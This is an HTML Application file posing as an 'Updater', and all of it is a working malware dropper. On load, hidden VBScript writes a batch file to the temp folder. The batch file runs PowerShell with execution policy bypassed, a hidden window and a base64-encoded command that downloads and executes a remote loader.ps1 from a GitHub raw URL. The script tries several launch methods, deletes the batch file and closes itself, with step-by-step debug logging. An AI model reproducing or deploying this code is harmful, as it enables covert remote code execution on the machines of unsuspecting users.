<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    border="none"
    borderstyle="complex"
    caption="no"
    sysmenu="no"
    scroll="no"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
        Dim sh, fso, tempPath, batPath, batContent, encodedCmd, debugPath
        Set sh = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_detailed_debug.txt")
        tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
        batPath = tempPath & "\run.bat"
        encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
        
        ' Initialize debug log
        Dim debugFile
        Set debugFile = fso.CreateTextFile(debugPath, True)
        debugFile.WriteLine "=== DETAILED DEBUG LOG ==="
        debugFile.WriteLine "Start Time: " & Now()
        debugFile.WriteLine "Temp Path: " & tempPath
        debugFile.WriteLine "Batch Path: " & batPath
        debugFile.WriteLine "Encoded Command Length: " & Len(encodedCmd)
        debugFile.WriteLine "Encoded Command Preview: " & Left(encodedCmd, 50) & "..."
        debugFile.WriteLine ""
        debugFile.Close
        
        ' Step 1: Test basic file creation
        LogStep "Step 1: Testing basic file creation"
        Dim testFile
        Set testFile = fso.CreateTextFile(tempPath & "\test.txt", True)
        testFile.WriteLine "Test file created successfully"
        testFile.Close
        LogStep "Step 1: Basic file creation - SUCCESS"
        
        ' Step 2: Create batch file with detailed logging
        LogStep "Step 2: Creating batch file"
        batContent = "@echo off" & vbCrLf & _
                    "echo Batch file started > """ & tempPath & "\batch_log.txt""" & vbCrLf & _
                    "echo Command: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & Left(encodedCmd, 30) & "... >> """ & tempPath & "\batch_log.txt""" & vbCrLf & _
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & vbCrLf & _
                    "echo PowerShell command executed >> """ & tempPath & "\batch_log.txt""" & vbCrLf & _
                    "timeout /t 5 /nobreak >nul" & vbCrLf & _
                    "del """ & batPath & """"
        
        On Error Resume Next
        Set batFile = fso.CreateTextFile(batPath, True)
        If Err.Number <> 0 Then
            LogStep "Step 2: ERROR creating batch file - " & Err.Description
            Exit Sub
        End If
        batFile.Write batContent
        batFile.Close
        If Err.Number <> 0 Then
            LogStep "Step 2: ERROR writing batch file - " & Err.Description
            Exit Sub
        End If
        LogStep "Step 2: Batch file created - SUCCESS"
        LogStep "Step 2: Batch file size: " & fso.GetFile(batPath).Size & " bytes"
        On Error GoTo 0
        
        ' Step 3: Verify batch file exists and is readable
        LogStep "Step 3: Verifying batch file"
        If fso.FileExists(batPath) Then
            LogStep "Step 3: Batch file exists - SUCCESS"
            Dim readBack
            Set readBack = fso.OpenTextFile(batPath, 1)
            LogStep "Step 3: Batch content preview: " & Left(readBack.ReadAll(), 100) & "..."
            readBack.Close
        Else
            LogStep "Step 3: Batch file does NOT exist - FAILED"
            Exit Sub
        End If
        
        ' Step 4: Test different execution methods
        LogStep "Step 4: Testing execution methods"
        
        ' Method A: Direct execution
        LogStep "Step 4A: Direct execution"
        sh.Run Chr(34) & batPath & Chr(34), 0, False
        
        ' Method B: Through cmd.exe
        LogStep "Step 4B: Through cmd.exe"
        sh.Run "cmd.exe /c """ & batPath & """", 0, False
        
        ' Method C: Using start command
        LogStep "Step 4C: Using start command"
        sh.Run "cmd.exe /c start /min """ & batPath & """", 0, False
        
        ' Method D: Alternative PowerShell execution
        LogStep "Step 4D: Alternative PowerShell execution"
        Dim altCmd
        altCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd
        sh.Run altCmd, 0, False
        
        setTimeout "CheckResults", 8000
    End Sub
    
    Sub LogStep(message)
        Dim fso, debugPath, debugFile
        Set fso = CreateObject("Scripting.FileSystemObject")
        debugPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_detailed_debug.txt")
        Set debugFile = fso.OpenTextFile(debugPath, 8, True)
        debugFile.WriteLine Now() & " - " & message
        debugFile.Close
    End Sub
    
    Sub CheckResults()
        LogStep "Step 5: Checking results"
        Dim fso, tempPath
        Set fso = CreateObject("Scripting.FileSystemObject")
        tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
        
        ' Check if batch log was created
        If fso.FileExists(tempPath & "\batch_log.txt") Then
            LogStep "Step 5: Batch log found - batch file executed"
            Dim batchLog
            Set batchLog = fso.OpenTextFile(tempPath & "\batch_log.txt", 1)
            LogStep "Step 5: Batch log content: " & batchLog.ReadAll()
            batchLog.Close
        Else
            LogStep "Step 5: No batch log found - batch file may not have executed"
        End If
        
        ' Check if batch file still exists
        If fso.FileExists(tempPath & "\run.bat") Then
            LogStep "Step 5: Batch file still exists - may indicate execution failure"
        Else
            LogStep "Step 5: Batch file was deleted - indicates successful execution"
        End If
        
        setTimeout "CleanupAndExit", 2000
    End Sub
    
    Sub CleanupAndExit()
        LogStep "Step 6: HTA closing"
        self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
